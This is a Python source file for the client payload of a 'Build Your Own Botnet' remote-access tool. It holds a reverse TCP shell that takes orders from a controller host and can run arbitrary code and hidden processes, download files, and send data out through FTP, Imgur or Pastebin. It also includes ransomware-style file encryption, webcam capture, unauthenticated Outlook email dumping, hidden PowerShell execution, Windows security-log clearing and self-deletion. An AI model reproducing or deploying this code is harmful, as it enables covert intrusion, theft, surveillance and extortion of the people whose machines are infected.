#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""

# standard library

import os
import sys
import time
import json
import zlib
import uuid
import Queue
import base64
import ctypes
import struct
import socket
import random
import urllib
import urllib2
import marshal
import zipfile
import logging
import hashlib
import functools
import threading
import cStringIO
import httpimport
import contextlib
import subprocess
import logging.handlers

try:
    from urllib2 import urlopen
except ImportError:
    from urllib.request import urlopen


# globals

_debug      = True
_abort      = False
_threads    = dict({})
httpimport.INSECURE = True


# decorators

def config(*arg, **options):
    """
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
    """
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return _config


def threaded(function):
    """
    Decorator for making a function threaded
    """
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded



# classes


class util():

    """
    Utilities (Build Your Own Botnet)

    """
    global _abort
    global _debug
    global _threads


    @staticmethod
    def debug(info):
        """
        Log debugging info
        """
        if _debug:
            logger = logging.getLogger(__name__)
            logger.setLevel(logging.DEBUG)
            logger.handlers = [logging.StreamHandler()]
            logger.debug(str(info))
            

    @staticmethod
    def platform():
        """
        Return the OS/platform of host machine
        """
        try:
            return sys.platform
        except Exception as e:
            util.debug("{} error: {}".format(platform.func_name, str(e)))


    @staticmethod
    def public_ip():
        """
        Return public IP address of host machine
        """
        try:
            return urllib2.urlopen('http://api.ipify.org').read()
        except Exception as e:
            util.debug("{} error: {}".format(public_ip.func_name, str(e)))


    @staticmethod
    def local_ip():
        """
        Return local IP address of host machine
        """
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            util.debug("{} error: {}".format(local_ip.func_name, str(e)))


    @staticmethod
    def mac_address():
        """
        Return MAC address of host machine
        """
        try:
            return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
        except Exception as e:
            util.debug("{} error: {}".format(mac_address.func_name, str(e)))


    @staticmethod
    def architecture():
        """
        Check if host machine has 32-bit or 64-bit processor architecture
        """
        try:
            return int(struct.calcsize('P') * 8)
        except Exception as e:
            util.debug("{} error: {}".format(architecture.func_name, str(e)))


    @staticmethod
    def device():
        """
        Return the name of the host machine
        """
        try:
            return socket.getfqdn(socket.gethostname())
        except Exception as e:
            util.debug("{} error: {}".format(device.func_name, str(e)))


    @staticmethod
    def username():
        """
        Return username of current logged in user
        """
        try:
            return os.getenv('USER', os.getenv('USERNAME'))
        except Exception as e:
            util.debug("{} error: {}".format(username.func_name, str(e)))


    @staticmethod
    def administrator():
        """
        Return True if current user is administrator, otherwise False
        """
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
        except Exception as e:
            util.debug("{} error: {}".format(administrator.func_name, str(e)))


    @staticmethod
    def ipv4(address):
        """
        Return True if input is valid IPv4 address, otherwise False
        """
        try:
            if socket.inet_aton(str(address)):
               return True
        except:
            return False


    @staticmethod
    def variable(length=6):
        """
        Generate a random alphanumeric variable name of given length
        """
        try:
            return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
        except Exception as e:
            util.debug("{} error: {}".format(variable.func_name, str(e)))


    @staticmethod
    def status(timestamp):
        """
        Check the status of a job/thread
        """
        try:
            assert float(timestamp)
            c = time.time() - float(timestamp)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            util.debug("{} error: {}".format(job_status.func_name, str(e)))


    @staticmethod
    def post(url, headers={}, data={}):
        """
        Make a HTTP post request and return response
        """
        try:
            dat = urllib.urlencode(data)
            req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
            for key, value in headers.items():
                req.headers[key] = value
            return urllib2.urlopen(req).read()
        except Exception as e:
            util.debug("{} error: {}".format(post_request.func_name, str(e)))


    @staticmethod
    def alert(text, title):
        """
        Windows alert message box
        """
        try:
            t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
            t.daemon = True
            t.start()
            return t
        except Exception as e:
            util.debug("{} error: {}".format(windows_alert.func_name, str(e)))


    @staticmethod
    def normalize(source):
        """
        Normalize data/text/stream
        """
        try:
            if os.path.isfile(str(source)):
                return open(source, 'rb').read()
            elif hasattr(source, 'getvalue'):
                return source.getvalue()
            elif hasattr(source, 'read'):
                if hasattr(source, 'seek'):
                    source.seek(0)
                return source.read()
            else:
                return bytes(source)
        except Exception as e2:
            util.debug("{} error: {}".format(imgur.func_name, str(e2)))


    @staticmethod
    def registry_key(registry_key, key, value):
        """
        Create a new Windows Registry Key in HKEY_CURRENT_USER
        """
        if os.name is 'nt':
            try:
                import _winreg
                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, registry_key, 0, _winreg.KEY_WRITE)
                _winreg.SetValueEx(reg_key, key, 0, _winreg.REG_SZ, value)
                _winreg.CloseKey(reg_key)
                return True
            except Exception as e:
                util.debug("{} error: {}".format(str(e)))
        return False


    @staticmethod
    def png(image):
        """
        Takes input of raw image data and returns it a valid PNG data
        """
        try:
            if type(image) == numpy.ndarray:
                width, height = (image.shape[1], image.shape[0])
                data = image.tobytes()
            else:
                width, height = (image.width, image.height)
                data = image.rgb
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b"", b'IHDR', b"", b""]
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
            idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b"", b'IEND', b"", b""]
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
            util.debug("{} error: {}".format(png_from_data.func_name, str(e)))


    @staticmethod
    def emails(emails):
        """
        Takes input of emails from Outlook MAPI inbox and returns them in JSON format
        """
        try:
            output = {}
            while True:
                try:
                    email = emails.GetNext()
                except: break
                if email:
                    sender   = email.SenderEmailAddress.encode('ascii','ignore')
                    message  = email.Body.encode('ascii','ignore')[:100] + '...'
                    subject  = email.Subject.encode('ascii','ignore')
                    received = str(email.ReceivedTime).replace('/','-').replace('\\','')
                    result   = {'from': sender, 'subject': subject, 'message': message}
                    output[received] = result
                else: break
            return output
        except Exception as e:
            util.debug("{} error: {}".format(emails.func_name, str(e)))


    @staticmethod
    def delete(target):
        """
        Tries hard to delete file (via multiple methods, if necessary)
        """
        try:
            if os.path.isfile(target):
                try:
                    os.chmod(target, 777)
                except: pass
                if os.name is 'nt':
                    try:
                        _ = os.popen('attrib -h -s -r %s' % target).read()
                    except: pass
                try:
                    os.remove(target)
                except: pass
                try:
                    _ = os.popen(bytes('del /f /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            elif os.path.isdir(target):
                try:
                    _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            else:
                pass
        except Exception as e:
            util.debug("{} error: {}".format(delete.func_name, str(e)))
            

    @staticmethod
    def clear_system_logs():
        """
        Clear Windows system logs (Application, security, Setup, System)
        """
        if os.name is 'nt':
            for log in ["application","security","setup","system"]:
                try:
                    output = powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"' % log)
                    if output:
                        util.debug(output)
                except Exception as e:
                    util.debug("{} error: {}".format(clear_system_logs.func_name, str(e)))

    @staticmethod
    def kwargs(inputstring):
        """
        Takes a string as input and returns a dictionary of keyword arguments
        """
        try:
            return {i.partition('=')[0]: i.partition('=')[2] for i in str(inputstring).split() if '=' in i}
        except Exception as e:
            util.debug("{} error: {}".format(kwargs.func_name, str(e)))


    @staticmethod
    def powershell(code):
        """
        Execute code in Powershell.exe and return any results
        """
        if os.name is 'nt':
            try:
                powershell = 'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists('C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
                return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
            except Exception as e:
                util.debug("{} error: {}".format(powershell.func_name, str(e)))



class security():

    """
    Security (Build Your Own Botnet)

    """
    global _abort
    global _debug
    global _threads

    @staticmethod
    def diffiehellman(connection):
        """
        DiffieHellman key exchange for secure session keys even on monitored networks
        """
        if isinstance(connection, socket.socket):
            try:
                g  = 2
                p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
                a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
                xA = pow(g, a, p)
                connection.send(Crypto.Util.number.long_to_bytes(xA))
                xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
                x  = pow(xB, a, p)
                return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
            except Exception as e:
                util.debug("{} error: {}".format(security.diffiehellman.func_name, str(e)))
        else:
            util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(security.diffiehellman.func_name, socket.socket, type(connection)))

    @staticmethod
    def encrypt_aes(plaintext, key, padding='\x00'):
        """
        Encrypt data with 256-bit key using AES-cipher in authenticated OCB mode
        """
        text        = bytes(data) + (int(AES.block_size) - len(bytes(data)) % int(AES.block_size)) * bytes(padding)
        iv          = os.urandom(Crypto.Cipher.AES.block_size)
        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
        ciphertext  = iv + cipher.encrypt(text)
        hmac_sha256 = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext, digestmod=Crypto.Hash.SHA256).digest()
        return base64.b64encode(ciphertext + hmac_sha256)

    @staticmethod
    def decrypt_aes(ciphertext, key, padding='\x00'):
        """
        Decrypt data encrypted by 256-bit key with AES-cipher in authenticated OCB mode
        """
        ciphertext  = base64.b64decode(ciphertext)
        iv          = ciphertext[:Crypto.Cipher.AES.block_size]
        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
        read_hmac   = ciphertext[-Crypto.Hash.SHA256.digest_size:]
        calc_hmac   = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext[:-Crypto.Hash.SHA256.digest_size], digestmod=Crypto.Hash.SHA256).digest()
        util.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
        return cipher.decrypt(ciphertext[Crypto.Cipher.AES.block_size:-Crypto.Hash.SHA256.digest_size]).rstrip(padding)


class shell():

    """
    Reverse TCP shell (Build Your Own Botnet)
    
    """
    global _abort
    global _debug
    global _threads


    def __init__(self, host='localhost', port=1337, **kwargs):
        self.session    = {}
        self.system     = self.info()
        self.api        = self._api(host, port, **kwargs)
        self.commands   = {cmd: {'method': getattr(self, cmd), 'platforms': getattr(shell, cmd).platforms, 'usage': getattr(shell, cmd).usage, 'description': getattr(shell, cmd).func_doc.strip().rstrip()} for cmd in vars(shell) if hasattr(vars(shell)[cmd], 'command') if getattr(vars(shell)[cmd], 'command')}
        self._socket    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._flags     = {'connection': threading.Event(), 'passive': threading.Event(), 'prompt': threading.Event()}
        self._imports   = self._import_handler(host)


    def _api(self, host, port, **kwargs):
        try:
            api = dict({'host': str(host), 'port': int(port)})
            for k,v in kwargs.items():
                if k in ('ftp','imgur','paste'):
                    api[k] = v
            return api
        except Exception as e:
            util.debug(e)

            
    def _import_handler(self, host):
        imports = dict({'packages': [], 'modules': []})
        try:
            imports.update({'packages': self.package_handler(host)})
        except Exception as e1:
            util.debug(e1)
        try:
            imports.update({'modules': self.module_handler(host)})
        except Exception as e2:
            util.debug(e2)
        return imports


    @threaded
    def _prompt_handler(self):
        self._flags['prompt'].set()
        while True:
            try:
                self._flags['prompt'].wait()
                self.send(**{'client': self.system['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                self._flags['prompt'].clear()
            except Exception as e:
                util.debug("{} error: {}".format('prompt', str(e)))
                self._flags['prompt'].clear()


    @threaded
    def _thread_handler(self):
        try:
            while True:
                if _abort:
                    break
                else:
                    jobs = _threads.items()
                    for task, worker in jobs:
                        if not worker.is_alive():
                            dead = _threads.pop(task, None)
                            del dead
                    time.sleep(1)
        except Exception as e:
            util.debug('{} error: {}'.format(self._handler.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        change current working directory - args: pathname
        """
        try:
            if os.path.isdir(path):
                return os.chdir(path)
            else:
                return os.chdir('.')
        except Exception as e:
            util.debug("{} error: {}".format(self.cd.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        list directory contents
        """
        try:
            output = []
            if os.path.isdir(path):
                for line in os.listdir(path):
                    if len('\n'.join(output + [line])) < 2048:
                        output.append(line)
                    else:
                        break
                return '\n'.join(output)
            else:
                return "Error: path not found"
        except Exception as e2:
            util.debug("{} error: {}".format(self.ls.func_name, str(e2)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        display file contents
        """
        try:
            output = []
            if not os.path.isfile(path):
                return "Error: file not found"
            for line in open(path, 'rb').readlines():
                try:
                    line = line.rstrip()
                    if len(line) and not line.isspace():
                        if len('\n'.join(output + [line])) < 48000:
                            output.append(line)
                        else:
                            break
                except Exception as e1:
                    util.debug("{} error: {}".format(self.cat.func_name, str(e1)))
            return '\n'.join(output)
        except Exception as e2:
            util.debug("{} error: {}".format(self.cat.func_name, str(e2))  )


    def ftp(self, source, filetype=None):
        """
        Upload file/data to FTP server (requires: FTP credentials)
        """
        try:
            creds = self.api.get('ftp')
            if creds and isinstance(creds, list):
                if len(creds) != 3:
                    return "Error: missing one or more FTP credentials (host, user, password)"
                creds = {'host': creds[0], 'user': creds[1], 'password': creds[2]}
                path  = ''
                local = time.ctime().split()
                if os.path.isfile(str(source)):
                    path   = source
                    source = open(str(path), 'rb')
                elif hasattr(source, 'seek'):
                    source.seek(0)
                else:
                    source = cStringIO.StringIO(bytes(source))
                try:
                    host = ftplib.FTP(**creds)
                except:
                    return "Upload failed - remote FTP server error: invalid credentials ('{}')".format(repr(creds))
                addr = public_ip()
                if 'tmp' not in host.nlst():
                    host.mkd('/tmp')
                if addr not in host.nlst('/tmp'):
                    host.mkd('/tmp/{}'.format(addr))
                if path:
                    path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
                else:
                    if filetype:
                        filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                    else:
                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
                stor = host.storbinary('STOR ' + path, source)
                return path
        except Exception as e2:
            return "{} error: {}".format(self.ftp.func_name, str(e2))



    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        show name of present working directory
        """
        try:
            return os.getcwd()
        except Exception as e:
            util.debug("{} error: {}".format(self.pwd.func_name, str(e)))


    def run(self):
        """
        run client startup routine
        """
        try:
            if self.connect():
                _threads['thread_handler'] = self._thread_handler()
                _threads['shell'] = self.reverse_tcp_shell()
            else:
                util.debug("connection timed out")
        except Exception as e:
            util.debug("{} error: {}".format(self.run.func_name, str(e)))
    

    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        execute Python code in current context
        """
        try:
            return eval(code)
        except Exception as e:
            util.debug("{} error: {}".format(self.eval.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        download file from url as temporary file and return filepath
        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                util.debug("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"
        

    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self, debug=False):
        """
        shutdown the current connection and reset session
        """
        try:
            self._flags['connection'].clear()
            self._flags['prompt'].clear()
            if 'socket' in self.session:
                if isinstance(self._socket, socket.socket):
                    self._socket.shutdown(socket.SHUT_RDWR)
                    self._socket.close()
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.session['key'] = None
            self.session['public_key'] = None
            _threads = _threads.keys()
            for worker in _threads:
                try:
                    self.stop(worker)
                except Exception as e2:
                    util.debug("{} error: {}".format(self.kill.func_name, str(e2)))
        except Exception as e:
            util.debug("{} error: {}".format(self.kill.func_name, str(e)))
    
    @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self, cmd=None):
        """
        list commands with usage information
        """
        if not cmd:
            try:
                return json.dumps({self.commands[c]['usage']: self.commands[c]['description'] for c in self.commands})
            except Exception as e1:
                util.debug("{} error: {}".format(self.help.func_name, str(e1)))
        elif hasattr(self, str(cmd)) and 'prompt' not in cmd:
            try:
                return json.dumps({self.commands[cmd]['usage']: self.commands[cmd]['description']})
            except Exception as e2:
                util.debug("{} error: {}".format(self.help.func_name, str(e2)))
        else:
            return "Invalid command - '{}' not found".format(cmd)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        show value of an attribute
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: status(_threads[a].name) for a in _threads if _threads[a].is_alive()})
            
            elif 'privileges' in attribute:
                return json.dumps({'username': self.system.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})

            elif 'info' in attribute:
                return json.dumps(self.system)

            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass

            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
                    
            else:
                return self.show.usage
            
        except Exception as e:
            util.debug("'{}' error: {}".format(_threads.func_name, str(e)))


    def send(self, **kwargs):
        """
        Send encrypted message to server
        """
        try:
            if self._flags['connection'].wait(timeout=1.0):
                if self._flags['passive'].is_set():
                    host = self.api.get('host')
                    self.task_handler(host=host, task=kwargs)
                else:
                    if kwargs.get('result'):
                        buff = kwargs.get('result')
                        kwargs.update({'result': buff[:48000]})
                    data = security.encrypt_aes(json.dumps(kwargs), self.session['key'])
                    self._socket.send(struct.pack('L', len(data)) + data)
                    if len(buff[48000:]):
                        kwargs.update({'result': buff[48000:]})
                        return self.send(**kwargs)
            else:
                util.debug("connection timed out")
        except Exception as e:
            util.debug('{} error: {}'.format(self.send.func_name, str(e)))


    @config(platforms=['win32','linux','darwin'], command=True, usage='mode <active/passive>')
    def mode(self, m):
        """
        Select client mode (active/passive)
        """
        try:
            if str(m) == 'passive':
                self._flags['passive'].set()
                return "Mode: passive"
            elif str(m) == 'active':
                self._flags['passive'].clear()
                return "Mode: active"
            else:
                return self.mode.usage
        except Exception as e:
            util.debug(e)
                

    def recv(self, sock=None):
        """
        Receive and decrypt incoming message from server
        """
        try:
            if not sock:
                sock = self._socket
            header_size = struct.calcsize('L')
            header = sock.recv(header_size)
            msg_len = struct.unpack('L', header)[0]
            data = ''
            while len(data) < msg_len:
                try:
                    data += sock.recv(1)
                except (socket.timeout, socket.error):
                    break
            if data and bytes(data):
                try:
                    text = security.decrypt_aes(data, self.session['key'])
                    task = json.loads(text)
                    return task
                except Exception as e2:
                    util.debug('{} error: {}'.format(self.recv.func_name, str(e2)))
        except Exception as e:
            util.debug("{} error: {}".format(self.recv.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
        self-destruct and leave no trace on the disk
        """
        _abort = True
        try:
            if os.name is 'nt':
                util.clear_system_logs()
            if 'persistence' in globals():
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(persistence, 'remove_{}'.format(method))()
                        except Exception as e2:
                            util.debug("{} error: {}".format(method, str(e2)))
            if not _debug:
                util.delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.get_shutdown)
            taskkill = threading.Thread(target=self.ps, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()
 

    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        stop a running job
        """
        try:
            if target in _threads:
                _ = _threads.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            util.debug("{} error: {}".format(self.stop.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        unzip a compressed archive/file
        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                util.debug("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)

    
    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def phone(self, args):
        """
        use an online phone to send text messages - mode: text
        """
        if 'phone' in globals():
            mode, _, args = str(args).partition(' ')
            if 'text' in mode:
                phone_number, _, message = args.partition(' ')
                return phone.text_message(phone_number, message)
            else:
                return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'
        else:
            return "Error: missing module 'sms'"


    def imgur(self, source):
        """
        Upload image file/data to Imgur (requires: Imgur api key)
        """
        try:
            key = self.api.get('imgur')
            if key and isinstance(key, list):
                if len(key) == 1:
                    api  = 'Client-ID {}'.format(key[0])
                    data = util.normalize(source)
                    post = util.post('https://api.imgur.com/3/upload', headers={'Authorization': api}, data={'image': base64.b64encode(data), 'type': 'base64'})
                    return str(json.loads(post)['data']['link'])
                else:
                    return "Error: use only 1 Imgur API key at a time"
            else:
                return "No Imgur API Key found"
        except Exception as e2:
            return "{} error: {}".format(self.imgur.func_name, str(e2))

      
    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
    def upload(self, args):
        """
        upload file to imgur, pastebin, or ftp server - mode: ftp, imgur, pastebin
        """
        try:
            mode, _, source = str(args).partition(' ')
            if not source:
                return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
            elif mode not in ('ftp','imgur','pastebin'):
                return self.upload.usage + ' - mode: ftp, imgur, pastebin'
            else:
                return getattr(self, mode)(source)
        except Exception as e:
            util.debug("{} error: {}".format(self.upload.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\AngryEggplant", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """
        encrypt personal files and ransom them
        """
        if 'ransom' not in globals():
            return "Error: missing module 'ransom'"
        elif not args:
            return "\tusage: ransom <encrypt/decrypt> [path]"
        else:
            cmd, _, action = str(args).partition(' ')
            if 'payment' in cmd:
                try:
                    return ransom.payment(action)
                except:
                    return "{} error: {}".format(shell._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
            elif 'decrypt' in cmd:
                return ransom.decrypt_threader(action)
            elif 'encrypt' in cmd:
                reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
                return ransom.encrypt_threader(action)
            else:
                return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
            

    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        stream the webcam or capture image/video - args: image, stream, video
        """
        try:
            if 'webcam' not in globals():
                return "Error: missing module 'webcam'"
            elif not args:
                result = self.webcam.usage
            else:
                args = str(args).split()
                if 'stream' in args:
                    if len(args) != 2:
                        result = "Error - stream mode requires argument: 'port'"
                    elif not str(args[1]).isdigit():
                        result = "Error - port must be integer between 1 - 65355"
                    else:
                        result = webcam.stream(port=args[1])
                else:
                    result = webcam.image(*args) if 'video' not in args else webcam.video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
        return result


    def connect(self):
        """
        connect to server and start new session
        """
        try:
            if not self.api.get('host') or not self.api.get('port'):
                util.debug("Error: missing required attributes 'host' and/or 'port'")
            else:
                host, port = self.api.get('host'), int(self.api.get('port'))
                self._socket.connect((host, port))
                self._socket.setblocking(True)
                self._flags['connection'].set()
                util.debug("Connected to {}:{}".format(host, port))
                self.session['key'] = security.diffiehellman(self._socket)
                self._socket.sendall(security.encrypt_aes(json.dumps(self.system), self.session['key']) + '\n')
                header_size = struct.calcsize('L')
                header  = self._socket.recv(header_size)
                msg_len = struct.unpack('L', header)[0]
                data    = ''
                while len(data) < msg_len:
                    try:
                        data += self._socket.recv(1)
                    except (socket.timeout, socket.error):
                        break
                if isinstance(data, bytes) and len(data):
                    _info = security.decrypt_aes(data.rstrip(), self.session['key']).strip().rstrip()
                    if isinstance(_info, dict):
                        self.system = _info
                    return True
        except Exception as e:
            util.debug("{} error: {}".format(self.connect.func_name, str(e)))
        return False

    
    @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """
        restart the client payload
        """
        try:
            util.debug("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', sys.argv[0], *sys.argv[1:])
        except Exception as e:
            util.debug("{} error: {}".format(self.restart.func_name, str(e)))


    @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """
        access Outlook email without authenticating or opening the GUI
        """
        if 'outlook' not in globals():
            return "Error: missing module 'outlook'"
        elif not args:
            try:
                if not outlook.installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(outlook % mode):
                    if 'dump' in mode or 'upload' in mode:
                        _threads['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
                        _threads['outlook'].daemon = True
                        _threads['outlook'].start()
                        return "Dumping emails from Outlook inbox"
                    elif hasattr(outlook, mode):
                        return getattr(outlook, mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
            except Exception as e:
                util.debug("{} error: {}".format(self.email.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """
        run an executable program in a hidden process
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    util.debug("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))


